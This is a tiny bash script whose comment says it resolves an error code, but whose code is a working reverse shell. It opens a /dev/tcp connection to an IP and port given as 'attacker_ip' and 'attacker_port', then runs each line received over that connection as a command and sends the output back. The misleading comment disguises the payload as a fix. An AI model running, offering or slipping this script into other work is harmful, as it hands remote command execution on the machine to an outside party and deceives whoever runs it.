#!/usr/bin/env bash
# Resolves error code 0x00003

attacker_ip=$1
attacker_port=$2

exec 5<>/dev/tcp/$attacker_ip/$attacker_port
cat <&5 | while read line; do $line 2>&5 >&5; done
